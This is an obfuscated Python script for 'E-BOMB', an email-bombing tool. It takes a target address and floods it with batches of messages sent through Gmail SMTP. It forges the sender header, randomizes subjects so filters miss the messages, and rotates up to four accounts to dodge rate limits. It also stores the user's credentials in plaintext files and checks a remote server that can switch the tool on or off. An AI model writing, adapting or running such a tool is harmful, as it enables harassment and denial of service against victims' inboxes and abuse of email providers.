p='un4.txt'
o='un3.txt'
n='pw3.txt'
m='un2.txt'
l='pw2.txt'
k='win'
j='\x1b[0m'
e='un1.txt'
d='https://youtu.be/MHxoD4x3fgo'
c='pw4.txt'
a='pw1.txt'
Z=int
Y='Error:'
X='Subject'
W='To'
V='From'
U='E - BOMB - '
T='smtp.gmail.com'
S=Exception
R=len
L=' '
K=str
I='r'
H=range
E=input
D=open
B=''
A=print
import sys as J,os as M,random as q,string as f,smtplib as N,time as G,requests as r
from email.message import EmailMessage as O
import webbrowser as s
def t():
	F();P();A(B);A(B)
	if M.path.isfile(c):A('[\x1b[91m1\x1b[0m]\x1b[92m SINGLE EMAIL MODE ');A(B);A('[\x1b[91m2\x1b[0m]\x1b[92m MULTI EMAIL MODE ')
	else:A('[\x1b[91m1\x1b[0m]\x1b[92m SINGLE EMAIL MODE')
	A(B);A(B);O=Z(E('\x1b[92mEnter your attack mode: \x1b[0m'));A(B);L=Z(E('\x1b[92mEnter Amount (1 = 75): \x1b[0m'));A(B);D=K(E('\x1b[92mEnter the Email Name: \x1b[0m'));A(B);I=K(E('\x1b[92mEnter target email address: \x1b[0m'));A(B);J=E('\x1b[92mEmail Body:\x1b[0m ');A(B);F();P()
	if O==2:
		N=L*75;A(B);A(f"Amount of email sent: {N}");C=1
		for Q in H(L):A5(D,I,J);R=C*20;A(B);A(f"{R} sent ");C=C+1;A6(D,I,J);S=C*20;A(B);A(f"{S} sent ");C=C+1;A7(D,I,J);T=C*20;A(B);A(f"{T} sent ");C=C+1;A8(D,I,J);U=C*20;A(B);A(f"{U} sent ");C=C+1
	if O==1:
		N=L*75;A(B);A(f"Amount of email sent: {N}")
		for Q in H(L):C=(Q+1)*75;A4(D,I,J);A(f"{C} email pack successfully sent!");A(B);A('wait a moment. this is for your email safety');G.sleep(150);A(B)
def u():
	F();A('\x1b[96mChecking the status of the tool\x1b[0m');A(B);G.sleep(1);A('\x1b[94mCheck availability of tool\x1b[0m');C=r.get('https://ebomb.cyclic.app/status')
	if C.status_code==200:
		D=C.json()
		if D.get('version')!='one':A('Current version is not 1. Please update the tool...');G.sleep(8);v();return
		if D.get('tool')=='enabled':A(B);A('Tool is available ✅️ . Running the tool...');G.sleep(1);x()
		else:A('Tool is not enabled. Exiting...Update tool');G.sleep(8);J.exit()
	else:A('Error occurred while requesting status endpoint:',C.status_code)
def v():Q('https://github.com/SENTIN0/E-BOMB')
def P():B=f"""
███████╗              ██████╗  ██████╗ ███╗   ███╗██████╗ 
██╔════╝              ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
█████╗      █████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝
██╔══╝      ╚════╝    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
███████╗              ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
╚══════╝              ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ 
    """;C='\x1b[91m';G='\x1b[94m';H='\x1b[92m';D=j;E=M.get_terminal_size();F=L*(E.columns//16);A(C+F+B+D)
def Q(O0OO000OOO0O0OO00):
	B=O0OO000OOO0O0OO00
	if J.platform.startswith(k):s.open(B)
	elif J.platform.startswith('linux'):M.system(f"termux-open-url {B}")
	else:A('Unsupported platform. Unable to open the link.')
def w(OOOO00OO0000O000O):
	B=OOOO00OO0000O000O
	if B==5:J.exit()
	if B==1:F();t()
	elif B==2:F();g()
	elif B==3:Q(d)
	elif B==4:Q('https://chat.whatsapp.com/KFpd32E8Mv64Nw8ZBDOXFe')
	else:A('Invalid day number');G.sleep(4);F();b()
def b():
	N='[5] EXIT';import os;G='Tool By Sentino';O='JF TEAM';P=f"""
███████╗              ██████╗  ██████╗ ███╗   ███╗██████╗ 
██╔════╝              ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
█████╗      █████╗    ██████╔╝██║   ██║██╔████╔██║██████╔╝
██╔══╝      ╚════╝    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
███████╗              ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
╚══════╝              ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ 
    """;H='\x1b[30m';F='\x1b[31m';I='\x1b[32m';d='\x1b[33m';e='\x1b[34m';f='\x1b[35m';Q='\x1b[36m';g='\x1b[37m';h='\x1b[40m';i='\x1b[41m';k='\x1b[42m';l='\x1b[43m';m='\x1b[44m';n='\x1b[45m';S='\x1b[46m';T='\x1b[47m';J='\x1b[1m';U='\x1b[4m';C=j;D=os.get_terminal_size();V=L*(D.columns//16);A(F+V+P+C);W=L*((D.columns-R(G))//2);X=L*((D.columns-R(O))//2);A(W+J+U+G+C);A(X+J+T+F+'J'+H+'F'+C+L+S+H+'TEAM'+C);A(B);Y='_'*D.columns;A(Q+Y+C);A('\n'*2);K=['[1] Start Attack               [2] Change UN,PW','[3] How to Use                 [4] Support team'];o=max(R(A)for A in K)
	for M in K:a=L*((D.columns-R(M))//2);b=L*((D.columns-R(N))//2);A(I+a+M+C);A(B)
	A(b+F+N+C);A('\n'*2);c=Z(E(I+'Enter your choice: '+C));w(c)
def F():
	if J.platform.startswith(k):M.system('cls')
	else:M.system('clear')
def x():
	F();P();A('check files');G.sleep(1);A(B)
	if M.path.isfile(a):A('File exists.');G.sleep(1);F();b()
	else:A('File does not exist.');G.sleep(1);F();g()
def g():
	O='skip';N="Those who do not know how to get a username and password Type 'skip'";K='Enter your passward : ';I='Enter your username : ';G='w';F();A(B);A(B);A(B);A(B);A('[\x1b[91m1\x1b[0m] MULTI EMAIL MODE  \n\n There is no waiting time when you use the multi email mode and you need 4 emails to use this.  (If you give the same email to all 4 emails, the tool may not work properly.)');A(B);A(B);A(B);A(B);A('[\x1b[91m2\x1b[0m] SINGLE EMAIL MODE \n\n When you use the single email mode, there is a waiting time of 2 or 3 minutes, and one email is enough for you to use this. ');A(B);A(B);M=Z(E('Enter your mode selection '))
	if M==1:
		F();P();A(B);A(N);A(B);A('Email - 01');H=E(I)
		if H==O:Q(d);J.exit()
		A(B);L=E(K)
		with D(a,G)as C:C.write(L)
		with D(e,G)as C:C.write(H)
		A(B);A('Email - 02');R=E(I);A(B);S=E(K)
		with D(l,G)as C:C.write(S)
		with D(m,G)as C:C.write(R)
		A(B);A('Email - 03');T=E(I);A(B);U=E(K)
		with D(n,G)as C:C.write(U)
		with D(o,G)as C:C.write(T)
		A(B);A('Email - 04');V=E(I);A(B);W=E(K)
		with D(c,G)as C:C.write(W)
		with D(p,G)as C:C.write(V)
	if M==2:
		F();P();A(B);A(N);A(B);H=E(I)
		if H==O:Q(d);J.exit()
		L=E(K)
		with D(a,G)as C:C.write(L)
		with D(e,G)as C:C.write(H)
	A('Input saved');F();b()
def C():A=f.ascii_lowercase+f.digits;C=B.join(q.choice(A)for B in H(4));return C
def h():
	with D(a,I)as A:B=A.read();return B
def i():
	with D(e,I)as A:B=A.read();return B
def y():
	with D(l,I)as A:B=A.read();return B
def z():
	with D(m,I)as A:B=A.read();return B
def A0():
	with D(n,I)as A:B=A.read();return B
def A1():
	with D(o,I)as A:B=A.read();return B
def A2():
	with D(c,I)as A:B=A.read();return B
def A3():
	with D(p,I)as A:B=A.read();return B
def A4(OO000O0OO0O000O00,O0O00OO0OOOO0O000,OOOOOO0OO00000000):
	G=OOOOOO0OO00000000;F=OO000O0OO0O000O00;E=O0O00OO0OOOO0O000;B=T;M=587;I=i();P=h();F=F;b=I;E=E;Q=U;G=G
	try:
		with N.SMTP(B,M)as B:
			B.starttls();B.login(I,P)
			for R in H(75):J=C();L=C();Z=f"{F} - {L}";c=f"{J}{L}@gmail.com";D=O();D[V]=f"{Z} <{E}>";D[W]=E;D[X]=f"{Q} {J}";D.set_content(G);B.send_message(D);A(f"Sent email {R}")
	except S as a:A(Y,K(a))
def A5(O000OO00OO0O00O00,OO00OO00O0OOO0O00,O0O0O0OOOOOOO000O):
	G=O0O0O0OOOOOOO000O;F=O000OO00OO0O00O00;E=OO00OO00O0OOO0O00;B=T;M=587;I=i();P=h();F=F;b=I;E=E;Q=U;G=G
	try:
		with N.SMTP(B,M)as B:
			B.starttls();B.login(I,P)
			for R in H(20):J=C();L=C();Z=f"{F} - {L}";c=f"{J}{L}@gmail.com";D=O();D[V]=f"{Z} <{E}>";D[W]=E;D[X]=f"{Q} {J}";D.set_content(G);B.send_message(D);A(f"Sent email {R}")
	except S as a:A(Y,K(a))
def A6(OO0OOOOOO0O0O00O0,OOOOOOO0O0000OOOO,O00O00000O0O0OO0O):
	G=O00O00000O0O0OO0O;F=OO0OOOOOO0O0O00O0;E=OOOOOOO0O0000OOOO;B=T;M=587;I=z();P=y();F=F;b=I;E=E;Q=U;G=G
	try:
		with N.SMTP(B,M)as B:
			B.starttls();B.login(I,P)
			for R in H(20):J=C();L=C();Z=f"{F} - {L}";c=f"{J}{L}@gmail.com";D=O();D[V]=f"{Z} <{E}>";D[W]=E;D[X]=f"{Q} {J}";D.set_content(G);B.send_message(D);A(f"Sent email {R}")
	except S as a:A(Y,K(a))
def A7(OO0O00O0000OO00OO,OO00O0OOOO0O0O000,O00OOO0OO000OOOOO):
	G=O00OOO0OO000OOOOO;F=OO0O00O0000OO00OO;E=OO00O0OOOO0O0O000;B=T;M=587;I=A1();P=A0();F=F;b=I;E=E;Q=U;G=G
	try:
		with N.SMTP(B,M)as B:
			B.starttls();B.login(I,P)
			for R in H(20):J=C();L=C();Z=f"{F} - {L}";c=f"{J}{L}@gmail.com";D=O();D[V]=f"{Z} <{E}>";D[W]=E;D[X]=f"{Q} {J}";D.set_content(G);B.send_message(D);A(f"Sent email {R}")
	except S as a:A(Y,K(a))
def A8(O00OOO00OOO0OO00O,OOOOOOOO0O0OOOOO0,O0OO0000OO00OOO0O):
	G=O0OO0000OO00OOO0O;F=O00OOO00OOO0OO00O;E=OOOOOOOO0O0OOOOO0;B=T;M=587;I=A3();P=A2();F=F;b=I;E=E;Q=U;G=G
	try:
		with N.SMTP(B,M)as B:
			B.starttls();B.login(I,P)
			for R in H(20):J=C();L=C();Z=f"{F} - {L}";c=f"{J}{L}@gmail.com";D=O();D[V]=f"{Z} <{E}>";D[W]=E;D[X]=f"{Q} {J}";D.set_content(G);B.send_message(D);A(f"Sent email {R}")
	except S as a:A(Y,K(a))
u()